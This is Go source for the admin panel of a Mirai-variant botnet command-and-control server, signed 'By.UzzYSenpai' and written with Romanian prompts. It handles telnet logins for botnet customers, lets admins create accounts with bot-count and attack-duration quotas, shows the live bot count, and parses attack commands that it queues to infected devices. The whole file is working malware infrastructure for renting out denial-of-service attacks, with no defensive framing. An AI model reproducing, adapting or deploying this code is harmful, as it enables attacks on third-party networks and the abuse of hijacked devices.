package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0m\033[2;49;35mScrie User\033[0m\033[2;49;96m:\033[0m\033[2;49;35m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0m\033[2;49;35mScrie parola\033[0m\033[2;49;96m:\033[0m\033[2;49;35m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r   \033[0m\033[2;49;35m  Server-ul se incarca\033[0m\033[2;49;96m... \033[0m\033[2;49;33m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[0m\033[2;49;35m Datele de autentificare au fost eronate\033[0m\033[2;49;96m.\r\n"))
        this.conn.Write([]byte("\r\033[0m\033[2;49;35m Nu ai un cont pe acest BotNet\033[0m\033[2;49;96m. (\033[0m\033[2;49;35mApasa orice tasta\033[0m\033[2;49;96m)\033[0m\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    this.conn.Write([]byte("\r\n\033[0m"))
    time.Sleep(250 * time.Millisecond)
    time.Sleep(500 * time.Millisecond)
    time.Sleep(150 * time.Millisecond)
    this.conn.Write([]byte("\r\n\033[0m"))
    for i := 0; i < 4; i++ {
        time.Sleep(100 * time.Millisecond)
    }

        this.conn.Write([]byte("\r\n")) 
    this.conn.Write([]byte("\r\x1b[0;37m\r\n"))
    this.conn.Write([]byte("\r\n\033[0m"))       
    this.conn.Write([]byte("\r    \033[0m\033[2;49;35m╔═════════════════════════════════════════════════╗	\r\n"))        
    this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[2;49;90m╔══ ╔══ ╔╗╔ ╔═╗ ╔═╗ ═╔═ ╔══ ╔═╗ ╔ ╗ ╔═╗ ╔═╗   \033[0m\033[2;49;35m║	\r\n"))      
    this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[2;49;34m╚═╗ ║══ ║║║ ╔═╝ ║═║  ║  ╚═╗ ║ ║ ║ ║ ║═║ ║ ║   \033[0m\033[2;49;35m║	\r\n"))        
    this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[0;37m╚═╝ ╚══ ╝╚╝ ╝   ╝ ╚ ═╝═ ╚═╝ ╚═╚ ╚═╝ ╝ ╚ ╚═╝   \033[0m\033[2;49;35m║	\r\n"))         
    this.conn.Write([]byte("\r    \033[0m\033[2;49;35m╚══╗═══════════════════════════════════════════╔══╝	\r\n"))      
    this.conn.Write([]byte("\r       \033[0m\033[2;49;35m╚═╗ \033[0m\033[2;49;96m28 09 2020 \033[0m\033[2;49;35m═ \033[0m\033[2;49;96mBy.UzzYSenpai - Mirai.!. \033[0m\033[2;49;35m╔═╝	\r\n")) 
    this.conn.Write([]byte("\r    	 \033[0m\033[2;49;35m╚═══════════════════════════════════════╝		\r\n\n\033[0m"))
    

    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Otakus: %d \007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
	
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[0m\033[2;49;35mNotice me Senpai\033[0m\033[2;49;96m! > \033[0m\033[2;49;35m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "clear" || cmd == "cls" || cmd == "c" {

            this.conn.Write([]byte("\033[H\033[2J"))   
            this.conn.Write([]byte("\r    \033[0m\033[2;49;35m╔═════════════════════════════════════════════════╗	\r\n"))        
            this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[2;49;90m╔══ ╔══ ╔╗╔ ╔═╗ ╔═╗ ═╔═ ╔══ ╔═╗ ╔ ╗ ╔═╗ ╔═╗   \033[0m\033[2;49;35m║	\r\n"))      
            this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[2;49;34m╚═╗ ║══ ║║║ ╔═╝ ║═║  ║  ╚═╗ ║ ║ ║ ║ ║═║ ║ ║   \033[0m\033[2;49;35m║	\r\n"))        
            this.conn.Write([]byte("\r    \033[0m\033[2;49;35m║	\033[0m\033[0;37m╚═╝ ╚══ ╝╚╝ ╝   ╝ ╚ ═╝═ ╚═╝ ╚═╚ ╚═╝ ╝ ╚ ╚═╝   \033[0m\033[2;49;35m║	\r\n"))         
            this.conn.Write([]byte("\r    \033[0m\033[2;49;35m╚══╗═══════════════════════════════════════════╔══╝	\r\n"))      
            this.conn.Write([]byte("\r       \033[0m\033[2;49;35m╚═╗ \033[0m\033[2;49;96m28 09 2020 \033[0m\033[2;49;35m═ \033[0m\033[2;49;96mBy.UzzYSenpai - Mirai.!. \033[0m\033[2;49;35m╔═╝	\r\n"))
            this.conn.Write([]byte("\r    	 \033[0m\033[2;49;35m╚═══════════════════════════════════════╝		\r\n\033[0m"))
            continue
        }
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "add" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
		
		        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
		
        if userInfo.admin == 1 && cmd == "bots" || cmd == "arch" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
